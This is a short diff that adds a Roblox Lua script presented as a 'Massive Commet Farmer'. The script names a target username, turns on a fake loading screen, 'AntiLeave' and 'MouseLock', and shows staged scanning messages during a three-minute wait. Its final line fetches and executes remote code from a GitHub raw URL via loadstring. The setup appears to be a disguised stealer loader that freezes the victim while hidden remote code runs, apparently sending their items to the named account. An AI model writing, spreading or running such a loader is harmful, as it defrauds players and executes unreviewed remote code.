@@ -1,0 +1,10 @@
+UserName = "Muscle_B0i"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+_G.ScriptName = "Massive Commet Farmer"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Scanning All Massive Commet"
+_G.ThirdText = "Finding Massive Comet"
+_G.WaitingTime = 180 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
